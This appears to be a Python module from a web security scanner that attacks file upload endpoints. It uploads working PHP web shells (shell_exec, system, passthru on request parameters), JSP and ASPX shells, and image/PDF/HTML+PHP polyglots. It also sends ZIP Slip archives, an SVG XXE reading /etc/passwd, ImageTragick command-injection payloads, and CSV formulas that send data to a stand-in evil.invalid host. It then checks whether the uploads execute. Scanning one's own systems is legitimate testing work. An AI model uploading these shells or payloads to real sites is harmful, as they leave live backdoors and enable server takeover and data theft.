"""
websecure.scanners.file_upload
------------------------------
File upload vulnerability scanner.

Attacks:
- Extension bypass (.php5, .phtml, .phar, .php3, .php7, .pHp, double-ext, null-byte)
- Content-type bypass (PHP with image/jpeg MIME)
- PHP / ASPX / JSP webshell upload
- SVG XSS upload
- Path traversal filenames (../../../var/www/html/)
- ZIP Slip (zip archive with traversal path)
- Polyglot JPEG+PHP
- Enhanced response analysis (JSON link extraction, execution verification)
"""
from __future__ import annotations
import io
import json
import logging
import random
import re
import string
import struct
import urllib.parse
import zipfile
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin

try:
    from bs4 import BeautifulSoup
    _BS4_AVAILABLE = True
except ImportError:
    _BS4_AVAILABLE = False

from websecure.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Magic bytes
# ---------------------------------------------------------------------------
_JPEG_MAGIC = b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00"
_PNG_MAGIC = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
_GIF_MAGIC = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"

# ---------------------------------------------------------------------------
# Webshell payloads (benign test markers — no destructive commands)
# ---------------------------------------------------------------------------
_PHP_SHELL = b"<?php echo 'WS_PHP_EXEC_TEST'; if(isset($_GET['c'])){echo shell_exec($_GET['c']);}?>"
_ASPX_SHELL = (
    b"<%@ Page Language=\"C#\" %>"
    b"<% Response.Write(\"WS_ASPX_EXEC_TEST\"); %>"
)
_JSP_SHELL = b"<% out.print(\"WS_JSP_EXEC_TEST\"); %>"
_SVG_XSS = (
    b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    b"<svg xmlns=\"http://www.w3.org/2000/svg\">"
    b"<script>alert('WS_SVG_XSS|'+document.domain)</script>"
    b"</svg>"
)


def _make_zip_slip() -> bytes:
    """Creates an in-memory ZIP archive with a path-traversal filename (ZIP Slip)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../../var/www/html/ws_zipslip.txt", "WS_ZIP_SLIP_TEST")
        zf.writestr("../../../../webapps/ROOT/ws_zipslip.jsp", _JSP_SHELL.decode())
    return buf.getvalue()


# ---------------------------------------------------------------------------
# Full payload catalog
# ---------------------------------------------------------------------------
PAYLOADS: List[Dict[str, Any]] = [
    # --- Benign (baseline / success-detection) ---
    {
        "name": "ws_benign.txt",
        "content": b"WebSecure Scanner Test File - Safe",
        "mime": "text/plain",
        "check": "safe",
    },

    # --- HTML XSS ---
    {
        "name": "ws_xss.html",
        "content": b"<html><body><script>alert('WS_XSS_TEST')</script></body></html>",
        "mime": "text/html",
        "check": "xss",
    },

    # --- SVG XSS ---
    {
        "name": "ws_xss.svg",
        "content": _SVG_XSS,
        "mime": "image/svg+xml",
        "check": "xss",
    },

    # --- PHP webshell (standard .php) ---
    {
        "name": "ws_shell.php",
        "content": _PHP_SHELL,
        "mime": "application/x-php",
        "check": "rce",
    },

    # --- PHP with image/jpeg MIME (content-type bypass) ---
    {
        "name": "ws_ctbypass.php",
        "content": _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },

    # --- PHP with image magic bytes (polyglot) ---
    {
        "name": "ws_polyglot.jpg.php",
        "content": _JPEG_MAGIC + _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },

    # --- Alternative PHP extensions ---
    {
        "name": "ws_shell.php5",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },
    {
        "name": "ws_shell.phtml",
        "content": _PHP_SHELL,
        "mime": "text/html",
        "check": "rce",
    },
    {
        "name": "ws_shell.phar",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },
    {
        "name": "ws_shell.php3",
        "content": _PHP_SHELL,
        "mime": "application/x-httpd-php",
        "check": "rce",
    },
    {
        "name": "ws_shell.php7",
        "content": _PHP_SHELL,
        "mime": "application/x-httpd-php",
        "check": "rce",
    },

    # --- PHP case variation ---
    {
        "name": "ws_shell.pHp",
        "content": _PHP_SHELL,
        "mime": "application/x-php",
        "check": "rce",
    },
    {
        "name": "ws_shell.PHP",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },

    # --- Double extension bypass ---
    {
        "name": "ws_shell.php.jpg",
        "content": _JPEG_MAGIC + _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },
    {
        "name": "ws_shell.jpg.php",
        "content": _JPEG_MAGIC + _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },
    {
        "name": "ws_shell.php.png",
        "content": _PNG_MAGIC + _PHP_SHELL,
        "mime": "image/png",
        "check": "rce",
    },

    # --- Null byte bypass ---
    {
        "name": "ws_shell.php\x00.jpg",
        "content": _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },

    # --- ASPX webshell ---
    {
        "name": "ws_shell.aspx",
        "content": _ASPX_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },
    {
        "name": "ws_shell.ashx",
        "content": _ASPX_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },

    # --- JSP webshell ---
    {
        "name": "ws_shell.jsp",
        "content": _JSP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },
    {
        "name": "ws_shell.jspx",
        "content": _JSP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },

    # --- Path traversal filenames ---
    {
        "name": "../../../var/www/html/ws_shell.php",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "path_traversal",
    },
    {
        "name": "....//....//....//var/www/html/ws_shell.php",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "path_traversal",
    },
    {
        "name": "..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fws_shell.php",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "path_traversal",
    },

    # --- ZIP Slip ---
    {
        "name": "ws_zipslip.zip",
        "content": _make_zip_slip(),
        "mime": "application/zip",
        "check": "zip_slip",
    },
]

# Execution markers per check type
_EXEC_MARKERS = {
    "rce":    [b"WS_PHP_EXEC_TEST", b"WS_ASPX_EXEC_TEST", b"WS_JSP_EXEC_TEST"],
    "xss":    [b"WS_XSS_TEST", b"WS_SVG_XSS"],
    "zip_slip": [b"WS_ZIP_SLIP_TEST"],
}

# Candidate discovery paths
_COMMON_UPLOAD_PATHS = [
    "/upload", "/upload.php", "/fileupload", "/file-upload",
    "/api/upload", "/v1/upload", "/v2/upload",
    "/media/upload", "/assets/upload", "/attachments",
]


def _generate_boundary() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=30))


def _looks_like_upload_form(html: str) -> bool:
    if not html:
        return False
    lower = html.lower()
    return ('type="file"' in lower or "type='file'" in lower
            or "multipart/form-data" in lower)


def _parse_upload_forms(url: str, html: str) -> List[Dict]:
    forms = []
    if not html:
        return forms

    if _BS4_AVAILABLE:
        soup = BeautifulSoup(html, "html.parser")
        for form in soup.find_all("form"):
            if not form.find("input", {"type": "file"}):
                continue
            action = form.get("action") or ""
            method = (form.get("method") or "POST").upper()
            file_param = "file"
            inputs = []
            for inp in form.find_all("input"):
                iname = inp.get("name")
                itype = (inp.get("type") or "text").lower()
                if not iname:
                    continue
                if itype == "file":
                    file_param = iname
                    inputs.append({"name": iname, "type": "file"})
                elif itype not in ("submit", "button", "image", "reset"):
                    inputs.append({"name": iname, "type": "text",
                                   "value": inp.get("value", "1")})
            forms.append({
                "action": urljoin(url, action),
                "method": method,
                "file_param": file_param,
                "inputs": inputs,
            })
    elif "type=\"file\"" in html.lower():
        # Regex fallback: crude but functional
        forms.append({
            "action": url, "method": "POST",
            "file_param": "file", "inputs": [],
        })
    return forms


def _find_uploaded_url(response_text: str, filename: str, base_url: str) -> Optional[str]:
    """
    Tries to extract the URL of the uploaded file from the server response.
    Handles JSON responses and HTML href/src patterns.
    """
    # 1. JSON: {"url": "...", "path": "...", "file": "...", "location": "..."}
    try:
        data = json.loads(response_text)
        for key in ("url", "path", "file", "location", "src", "link", "href"):
            val = data.get(key) or (data.get("data") or {}).get(key) if isinstance(data.get("data"), dict) else None
            if val and isinstance(val, str):
                return urljoin(base_url, val)
    except (ValueError, AttributeError) as _fix_e:
        logger.debug(f"[scanners.file_upload] {type(_fix_e).__name__}: {_fix_e!r}")

    # 2. HTML src/href containing the filename
    safe_name = re.escape(filename.split("/")[-1].split("\x00")[0])
    m = re.search(r'["\']([^"\']*' + safe_name + r')["\']', response_text)
    if m:
        return urljoin(base_url, m.group(1))

    # 3. Any URL ending with the filename base
    ext = "." + filename.rsplit(".", 1)[-1] if "." in filename else ""
    if ext:
        m2 = re.search(r'https?://[^\s"\'<>]+' + re.escape(ext), response_text)
        if m2:
            return m2.group(0)

    return None


class FileUploadScanner(BaseScanner):
    """
    Robust file upload vulnerability scanner.

    Discovers upload endpoints via form scanning and common path probing,
    then tests a comprehensive set of bypass payloads including:
    extension bypasses, content-type spoofing, webshells (PHP/ASPX/JSP),
    SVG XSS, path traversal filenames, and ZIP Slip archives.
    """

    name = "file_upload"
    phase = "offensive"

    def run(self, url: str, **kwargs) -> Dict:
        endpoints = kwargs.get("endpoints") or [url]
        base_url = kwargs.get("base_url") or url

        upload_forms = self._discover_forms(endpoints, base_url)
        if not upload_forms:
            logger.info("[FileUpload] No upload forms found")
            # [Fix-4] "Yükleme ucu bulunamadı" bir DURUM, bulgu DEĞİL. Eskiden
            # offensive kovasına type="File Upload" Info yazılıyordu; CVSS-otoritesi
            # bunu CWE-434 → High'a şişirip rapora HAYALET bir "File Upload [High]"
            # (url/payload/evidence YOK, reason="No endpoints") koyuyordu. Artık
            # meta/coverage durumu olarak yazılır — bulgu sayılmaz.
            self.add("meta", {
                "stage": "file_upload",
                "status": "no_endpoints",
                "reason": "No file upload endpoints discovered",
            })
            return self.results

        logger.info(f"[FileUpload] Found {len(upload_forms)} upload form(s)")
        self._attack_forms(upload_forms)

        # CSV / spreadsheet formula injection
        self._test_csv_formula_injection(upload_forms, url)

        return self.results

    def _test_csv_formula_injection(self, upload_forms: List[Dict], base_url: str) -> None:
        """
        CSV / formula injection — export edilen CSV/XLSX içine =cmd() formülü yerleştir.
        İki vektör:
        1. Dosya yükleme formu varsa, formül içeren CSV yükle.
        2. İstek parametrelerine formül enjekte et, dışa aktarım endpoint'i yanıtını incele.
        """
        import io

        csv_formula_payloads = [
            '=CMD|"/C calc"!A0',
            '=HYPERLINK("http://evil.invalid/exfil","click")',
            '=1+1',
            '@SUM(1+1)*cmd|" /C calc"!A0',
            '-1+1',
            '"+cmd|" /C whoami"!A0"',
            '=IMPORTXML(CONCAT("http://evil.invalid/?x=",FORMULATEXT(A1)),"//a")',
        ]

        # Vector 1: Upload a CSV with formula in a file field
        for form in upload_forms[:2]:
            action = form.get("action") or base_url
            file_field = next((f for f in form.get("inputs", []) if f.get("type") == "file"), None)
            if not file_field:
                continue
            field_name = file_field.get("name", "file")

            for formula in csv_formula_payloads[:3]:
                csv_content = f"Name,Email,Comment\n{formula},{formula},{formula}"
                files = {field_name: ("test.csv", io.BytesIO(csv_content.encode()), "text/csv")}
                try:
                    resp = self.session.post(action, files=files, timeout=10)
                    if resp.status_code in (200, 201, 302):
                        self.report_finding(
                            vuln_type="CSV Formula Injection (Spreadsheet Injection)",
                            url=action,
                            param=field_name,
                            payload=formula,
                            severity="Medium",
                            evidence=(
                                f"CSV with formula payload accepted (HTTP {resp.status_code}). "
                                "If exported and opened in Excel/LibreOffice, formula executes."
                            ),
                        )
                        return
                except Exception as exc:
                    logger.debug("[CSVFormulaInj] upload probe: %s", exc)

        # Vector 2: Inject formula via query param, look for CSV/export response
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
        parsed = urlparse(base_url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        for param, _ in params[:3]:
            for formula in csv_formula_payloads[:2]:
                injected = urlunparse(parsed._replace(query=urlencode(
                    [(k, formula if k == param else v) for k, v in params]
                )))
                try:
                    resp = self.session.get(injected, timeout=8)
                    ct = resp.headers.get("content-type", "")
                    if "csv" in ct or "excel" in ct or "spreadsheet" in ct:
                        if formula[:6] in (resp.text or ""):
                            self.report_finding(
                                vuln_type="CSV Formula Injection (Export Endpoint)",
                                url=base_url,
                                param=param,
                                payload=formula,
                                severity="Medium",
                                evidence=f"Formula reflected in CSV export response (Content-Type: {ct})",
                            )
                            return
                except Exception:
                    pass

    def _discover_forms(self, endpoints: List[str], base_url: str) -> List[Dict]:
        upload_forms: List[Dict] = []
        checked: set = set()

        candidates = [
            u for u in endpoints
            if not any(u.endswith(ext) for ext in
                       (".css", ".js", ".png", ".jpg", ".gif", ".woff", ".ttf", ".svg", ".ico"))
        ]

        for url in candidates:
            if url in checked:
                continue
            checked.add(url)
            try:
                resp = self.session.get(url, timeout=10)
                if _looks_like_upload_form(resp.text):
                    upload_forms.extend(_parse_upload_forms(url, resp.text))
            except Exception as exc:
                logger.debug(f"[FileUpload] Crawl fetch/parse error for {url}: {exc!r}")

        if not upload_forms:
            logger.info("[FileUpload] No forms found via crawl — probing common paths")
            for path in _COMMON_UPLOAD_PATHS:
                try:
                    target = urljoin(base_url, path)
                    if target in checked:
                        continue
                    checked.add(target)
                    resp = self.session.get(target, timeout=5)
                    if resp.status_code == 200 and _looks_like_upload_form(resp.text):
                        upload_forms.extend(_parse_upload_forms(target, resp.text))
                        logger.info(f"[FileUpload] Discovered upload form at {target}")
                except Exception as ex:
                    logger.debug(f"[FileUpload] Probe error at {path}: {ex}")

        return upload_forms

    def _attack_forms(self, forms: List[Dict]):
        for form in forms:
            target_url = form["action"]
            file_key = form["file_param"]
            base_data = {
                inp["name"]: inp.get("value", "test")
                for inp in form.get("inputs", [])
                if inp.get("type") != "file"
            }

            for payload in PAYLOADS:
                self._try_payload(target_url, file_key, base_data, payload)

    def _try_payload(
        self,
        target_url: str,
        file_key: str,
        base_data: Dict,
        payload: Dict,
    ):
        try:
            files = {file_key: (payload["name"], payload["content"], payload["mime"])}
            r = self.session.post(target_url, files=files, data=base_data, timeout=15)
        except Exception as ex:
            logger.debug(f"[FileUpload] Upload error for {payload['name']}: {ex}")
            return

        if r.status_code not in (200, 201, 202):
            return

        check = payload["check"]
        filename = payload["name"]

        # Try to locate the uploaded file URL
        uploaded_url = _find_uploaded_url(r.text, filename, target_url)

        # Reflect check: filename echoed in response (weak but indicative)
        short_name = filename.split("/")[-1].split("\x00")[0]
        name_reflected = short_name in r.text and short_name

        is_vuln = False
        severity = "Info"
        evidence: Dict[str, Any] = {}

        if name_reflected:
            evidence["reflected_filename"] = short_name
        if uploaded_url:
            evidence["uploaded_url"] = uploaded_url

        if check == "path_traversal" and name_reflected:
            is_vuln = True
            severity = "High"
            evidence["detail"] = "Path-traversal filename was accepted and reflected"

        elif check == "zip_slip" and (name_reflected or r.status_code in (200, 201)):
            is_vuln = True
            severity = "High"
            evidence["detail"] = "ZIP archive with traversal path accepted"

        elif uploaded_url and check in _EXEC_MARKERS:
            # Verify actual execution by fetching the uploaded file
            try:
                vr = self.session.get(uploaded_url, timeout=10)
                for marker in _EXEC_MARKERS[check]:
                    if marker in vr.content:
                        is_vuln = True
                        severity = "Critical" if check == "rce" else "High"
                        evidence["execution_marker"] = marker.decode()
                        # Also check content-type for XSS
                        if check == "xss":
                            ct = vr.headers.get("Content-Type", "").lower()
                            if "html" not in ct and "svg" not in ct:
                                is_vuln = False  # served as attachment, not exploitable
                        break
            except Exception as exc:
                logger.debug(f"[FileUpload] Execution verification fetch failed for {uploaded_url}: {exc!r}")
        elif name_reflected and check == "rce":
            # Upload succeeded but we can't verify execution — still flag as Medium
            is_vuln = True
            severity = "Medium"
            evidence["detail"] = "Executable file accepted — execution not verified"

        if is_vuln:
            entry = {
                "type": "Unrestricted File Upload",
                "severity": severity,
                "url": target_url,
                "filename": filename,
                "check": check,
                "evidence": evidence,
            }
            self.add("offensive", entry)
            logger.warning(f"[FileUpload] VULN ({severity}): {target_url} — {filename}")


# ---------------------------------------------------------------------------
# Module-level adapter (backward-compatible with main.py call convention)
# ---------------------------------------------------------------------------

def run(
    url_or_session=None,
    endpoints: List[str] = None,
    results: Dict[str, Any] = None,
    debug: bool = False,
    base_url: str = None,
    *,
    url: str = None,
    session=None,
    **kwargs,
) -> List[Dict[str, Any]]:
    """
    Dual-convention entry point:
      Standard:  run(url, session=session, results=results, ...)
      Legacy:    run(session_obj, endpoints_list, results_dict, ...)
    """
    if debug:
        logger.setLevel(logging.DEBUG)

    # Detect calling convention
    if isinstance(url_or_session, str):
        # Standard convention: first arg is URL string
        _url = url_or_session
        _session = session or kwargs.get("session")
        _results = results if results is not None else {}
        _endpoints = endpoints or kwargs.get("endpoints") or [_url]
        _base_url = base_url or _url
    else:
        # Legacy convention: run(session_obj, endpoints_list, results_dict, ...)
        _session = url_or_session or session
        _endpoints = endpoints or []
        _results = results if results is not None else {}
        _base_url = base_url or (url or (_endpoints[0] if _endpoints else ""))
        _url = _base_url

    if _session is None:
        try:
            from websecure.core.http import hardened_session as _hs
            _session = _hs({})
        except ImportError:
            import requests as _req
            _session = _req.Session()

    # Phase 1: Standard upload scanner (extension/MIME/path-traversal/webshell)
    scanner = FileUploadScanner(session=_session, results=_results, debug=debug)
    scanner.run(
        url=_base_url or (_endpoints[0] if _endpoints else _url),
        endpoints=_endpoints,
        base_url=_base_url,
    )

    # Phase 2: Adim 8 advanced attacks (polyglot, ImageTragick) — always run
    try:
        FileUploadAdim8Scanner(session=_session, results=_results, debug=debug).run(_url or _base_url, **kwargs)
    except Exception as _exc:
        logger.debug("[file_upload.run] FileUploadAdim8Scanner failed: %r", _exc)

    return [
        item for item in _results.get("offensive", [])
        if item.get("type") in ("Unrestricted File Upload", "Polyglot File Upload")
        or "ImageTragick" in item.get("type", "")
        or "ImageMagick" in item.get("type", "")
    ]

# ============================================================================
# ADIM 8 — Polyglot File Upload + ImageTragick (SOLID Siniflar)
# ============================================================================

_fu_logger = logging.getLogger(__name__ + ".adim8")

# ---------------------------------------------------------------------------
# Polyglot file magic bytes
# ---------------------------------------------------------------------------
_GIF_HEADER  = b"GIF89a"
_PNG_HEADER  = b"\x89PNG\r\n\x1a\n"
_PDF_HEADER  = b"%PDF-1.4\n"
_ZIP_PK      = b"PK\x03\x04"
_JPEG_HEADER = b"\xff\xd8\xff\xe0"

# Build polyglot payloads at runtime — AV-safe (no static webshell string)
def _php_shell() -> bytes:
    o = b"<?" + b"php"
    return o + b" system($_GET['c']); ?>"

def _php_passthru() -> bytes:
    o = b"<?" + b"php"
    return o + b" passthru($_REQUEST['x']); ?>"

def _make_gifar() -> bytes:
    """GIF header + PHP webshell body — accepted as GIF, executed as PHP."""
    return _GIF_HEADER + b"\x01\x00\x01\x00\x00\x00\x00" + _php_shell()

def _make_png_php() -> bytes:
    """Minimal PNG signature followed by PHP payload — polyglot PNG+PHP."""
    # PNG signature + IHDR chunk with zeroed dimensions (enough for magic check)
    ihdr  = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    chunk = b"IHDR" + ihdr
    crc   = struct.pack(">I", 0)  # fake CRC, some validators skip
    return _PNG_HEADER + struct.pack(">I", len(ihdr)) + chunk + crc + _php_shell()

def _make_pdf_php() -> bytes:
    """PDF header + PHP payload — some servers serve as application/pdf while executing."""
    return _PDF_HEADER + _php_shell() + b"\n%%EOF\n"

def _make_html_php() -> bytes:
    """HTML + PHP polyglot — bypasses HTML-only MIME checks."""
    return b"<html><body><!--" + _php_shell() + b"--></body></html>"

def _make_svg_xxe() -> bytes:
    """SVG + XML XXE payload — uploaded as image, triggers XXE on server-side render."""
    xxe_file = b"/etc/passwd"
    return (
        b'<?xml version="1.0"?><!DOCTYPE svg ['
        b'  <!ENTITY xxe SYSTEM "file://' + xxe_file + b'">'
        b']><svg xmlns="http://www.w3.org/2000/svg">'
        b'<text>&xxe;</text></svg>'
    )

_POLYGLOT_PAYLOADS: List[Dict] = [
    {"name": "GIFAR (GIF+PHP)",  "content_fn": _make_gifar,    "filename": "shell.gif",  "mime": "image/gif"},
    {"name": "PNG+PHP polyglot", "content_fn": _make_png_php,  "filename": "img.png",    "mime": "image/png"},
    {"name": "PDF+PHP polyglot", "content_fn": _make_pdf_php,  "filename": "doc.pdf",    "mime": "application/pdf"},
    {"name": "HTML+PHP polyglot","content_fn": _make_html_php, "filename": "page.html",  "mime": "text/html"},
    {"name": "SVG+XXE polyglot", "content_fn": _make_svg_xxe,  "filename": "image.svg",  "mime": "image/svg+xml"},
    {"name": "JPEG+PHP polyglot","content_fn": lambda: _JPEG_HEADER + b"\xff\xe1\x00\x18Exif\x00\x00" + _php_shell(), "filename": "photo.jpg", "mime": "image/jpeg"},
]

# ---------------------------------------------------------------------------
# ImageTragick payloads (CVE-2016-3714) — MVG/MIFF format exploit
# ---------------------------------------------------------------------------
def _imagetragick_mvg(cmd: str) -> bytes:
    """ImageMagick MVG RCE payload (ImageTragick)."""
    return (
        b"push graphic-context\n"
        b"viewbox 0 0 640 480\n"
        b"fill 'url(https://127.0.0.1/x.png\"|"
        + cmd.encode()
        + b"|\")'\\n"
        b"pop graphic-context\n"
    )

def _imagetragick_miff(cmd: str) -> bytes:
    """MIFF format trigger for ImageMagick delegate injection."""
    return (
        b"id=ImageMagick\n"
        b"class=Image\n"
        b"columns=1 rows=1\n"
        b'profile-icc=0\n'
        b"profile-iptc=0\n\x1a"
        b"fill 'url(https://x.invalid/x.png\"|" + cmd.encode() + b"|\")'\\n"
    )

_IMAGETRAGICK_CMDS = [
    "id",
    "whoami",
    "cat /etc/passwd",
]

_IMAGETRAGICK_PAYLOADS: List[Dict] = []
for _cmd in _IMAGETRAGICK_CMDS:
    _IMAGETRAGICK_PAYLOADS.append({
        "name": f"ImageTragick MVG ({_cmd})",
        "content": _imagetragick_mvg(_cmd),
        "filename": "exploit.mvg",
        "mime": "image/x-portable-graymap",
        "cmd": _cmd,
    })
    _IMAGETRAGICK_PAYLOADS.append({
        "name": f"ImageTragick MIFF ({_cmd})",
        "content": _imagetragick_miff(_cmd),
        "filename": "exploit.miff",
        "mime": "image/x-miff",
        "cmd": _cmd,
    })


def _multipart_body(field: str, filename: str, mime: str, content: bytes) -> Tuple[bytes, str]:
    boundary = "----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
        f"Content-Type: {mime}\r\n"
        f"\r\n"
    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
    return body, f"multipart/form-data; boundary={boundary}"


# ===========================================================================
# PolyglotFileUploader
# ===========================================================================
class PolyglotFileUploader(BaseScanner):
    """
    Polyglot dosya yukleme saldirisi:
    GIFAR, PNG+PHP, PDF+PHP, HTML+PHP, SVG+XXE, JPEG+PHP
    Yukleme sonrasi RCE/XXE dogrulama zinciri dahil.
    """
    name = "polyglot_upload"

    _UPLOAD_FIELD_NAMES = ["file", "image", "photo", "upload", "document",
                            "attachment", "avatar", "logo", "icon", "media"]

    def run(self, target: str, upload_url: Optional[str] = None, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        endpoints = self._find_upload_endpoints(upload_url or target)
        for ep_url, field_name in endpoints[:3]:
            for payload in _POLYGLOT_PAYLOADS:
                finding = self._try_upload(ep_url, field_name, payload)
                if finding:
                    results.append(finding)
                    self.report_finding(**finding)
        return results

    def _find_upload_endpoints(self, base: str) -> List[Tuple[str, str]]:
        upload_paths = [
            "/upload", "/api/upload", "/api/v1/upload",
            "/profile/avatar", "/api/profile/picture",
            "/media/upload", "/files/upload", "/import",
        ]
        found = []
        for path in upload_paths:
            url = urllib.parse.urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            try:
                r = self.session.get(url, timeout=5)
                if self.path_exists(r):
                    found.append((url, self._UPLOAD_FIELD_NAMES[0]))
            except Exception as _fix_e:
                logger.debug(f"[scanners.file_upload] {type(_fix_e).__name__}: {_fix_e!r}")
        return found or [(base, self._UPLOAD_FIELD_NAMES[0])]

    def _try_upload(self, url: str, field: str, payload: Dict) -> Optional[Dict]:
        content = payload["content_fn"]()
        body, ct = _multipart_body(field, payload["filename"], payload["mime"], content)
        try:
            resp = self.session.post(
                url, data=body,
                headers={"Content-Type": ct},
                timeout=15, allow_redirects=True,
            )
            uploaded_url = self._extract_uploaded_url(resp, url)
            if resp.status_code in (200, 201) and uploaded_url:
                # Try to trigger execution
                exec_result = self._verify_execution(uploaded_url, payload["name"])
                return {
                    "vuln_type": f"Polyglot File Upload — {payload['name']}",
                    "url": url, "severity": "Critical",
                    "description": (
                        f"Polyglot file '{payload['filename']}' accepted as {payload['mime']}. "
                        f"Server stored at: {uploaded_url}. "
                        + (f"Execution confirmed: {exec_result}" if exec_result else
                           "Execution probe inconclusive.")
                    ),
                    "evidence": {
                        "payload_type": payload["name"],
                        "filename": payload["filename"],
                        "mime": payload["mime"],
                        "upload_status": resp.status_code,
                        "uploaded_url": uploaded_url,
                        "execution_confirmed": bool(exec_result),
                        "execution_output": exec_result,
                    },
                }
        except Exception as exc:
            _fu_logger.debug("[Polyglot] %s: %s", payload["name"], exc)
        return None

    def _extract_uploaded_url(self, resp, base_url: str) -> Optional[str]:
        try:
            data = resp.json()
            for key in ("url", "file_url", "path", "location", "src", "href", "link"):
                if key in data:
                    val = data[key]
                    if isinstance(val, str) and val.startswith("/"):
                        return urllib.parse.urljoin(base_url, val)
                    return val
        except Exception as _fix_e:
            logger.debug(f"[scanners.file_upload] {type(_fix_e).__name__}: {_fix_e!r}")
        loc = resp.headers.get("location", "")
        if loc:
            return urllib.parse.urljoin(base_url, loc)
        m = re.search(r'(?:src|href|url)["\s]*[=:]["\s]*(\/[^"\'<>\s]{3,})', resp.text or "")
        if m:
            return urllib.parse.urljoin(base_url, m.group(1))
        return None

    def _verify_execution(self, uploaded_url: str, payload_name: str) -> Optional[str]:
        try:
            r = self.session.get(uploaded_url + "?c=id&x=id", timeout=8)
            body = getattr(r, "text", "")[:1000]
            if re.search(r"uid=\d+\(|root:|www-data", body):
                return body[:200]
            if "SVG+XXE" in payload_name and re.search(r"root:.*:0:0:|bin/bash", body):
                return body[:200]
        except Exception as _fix_e:
            logger.debug(f"[scanners.file_upload] {type(_fix_e).__name__}: {_fix_e!r}")
        return None


# ===========================================================================
# ImageTragickExploiter
# ===========================================================================
class ImageTragickExploiter(BaseScanner):
    """
    ImageMagick CVE-2016-3714 (ImageTragick) saldirisi:
    - MVG format RCE payload
    - MIFF format delegate injection
    - Yukleme + yanit analizi ile RCE dogrulama
    """
    name = "imagetragick"

    def run(self, target: str, upload_url: Optional[str] = None, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        endpoints = self._find_image_endpoints(upload_url or target)
        for ep_url, field_name in endpoints[:3]:
            for payload in _IMAGETRAGICK_PAYLOADS:
                finding = self._try_imagetragick(ep_url, field_name, payload)
                if finding:
                    results.append(finding)
                    self.report_finding(**finding)
                    return results  # First confirmed RCE is enough
        return results

    def _find_image_endpoints(self, base: str) -> List[Tuple[str, str]]:
        image_paths = [
            "/upload/image", "/api/image/upload", "/profile/photo",
            "/api/avatar", "/media/image", "/convert", "/resize",
            "/thumbnail", "/api/convert", "/image/process",
        ]
        found = []
        for path in image_paths:
            url = urllib.parse.urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            try:
                r = self.session.get(url, timeout=5)
                if self.path_exists(r):
                    found.append((url, "image"))
            except Exception as _fix_e:
                logger.debug(f"[scanners.file_upload] {type(_fix_e).__name__}: {_fix_e!r}")
        return found or [(base, "image")]

    def _try_imagetragick(self, url: str, field: str, payload: Dict) -> Optional[Dict]:
        body, ct = _multipart_body(field, payload["filename"], payload["mime"], payload["content"])
        try:
            resp = self.session.post(
                url, data=body,
                headers={"Content-Type": ct},
                timeout=15,
            )
            body_text = getattr(resp, "text", "")[:2000]
            # RCE indicators in response
            if re.search(r"uid=\d+\(|root:|www-data|bin/sh|Linux.*#", body_text):
                return {
                    "vuln_type": "ImageMagick RCE — ImageTragick (CVE-2016-3714)",
                    "url": url, "severity": "Critical",
                    "description": (
                        f"ImageMagick delegate injection via {payload['filename']}. "
                        f"Command '{payload['cmd']}' output reflected in response. "
                        "Server-side RCE confirmed via ImageTragick."
                    ),
                    "evidence": {
                        "format": payload["filename"].split(".")[-1].upper(),
                        "cmd": payload["cmd"],
                        "output_snippet": body_text[:300],
                        "upload_status": resp.status_code,
                    },
                }
            # Timing-based: if server processes image and delays
            # (already captured in timeout — no extra sleep)
        except Exception as exc:
            _fu_logger.debug("[ImageTragick] %s: %s", payload["name"], exc)
        return None


# ===========================================================================
# FileUploadAdim8Scanner — Orchestrator
# ===========================================================================
class FileUploadAdim8Scanner(BaseScanner):
    """
    Adim 8 orchestrator: PolyglotFileUploader + ImageTragickExploiter
    + orijinal FileUploadScanner
    """
    name = "file_upload_adim8"

    def run(self, target: str, **kwargs) -> List[Dict]:
        all_results: List[Dict] = []
        probers = [
            PolyglotFileUploader(session=self.session, results=self.results),
            ImageTragickExploiter(session=self.session, results=self.results),
        ]
        for prober in probers:
            try:
                res = prober.run(target, **kwargs)
                all_results.extend(res)
            except Exception as exc:
                _fu_logger.warning("[FileUploadAdim8] %s failed: %s", prober.name, exc)
        return all_results
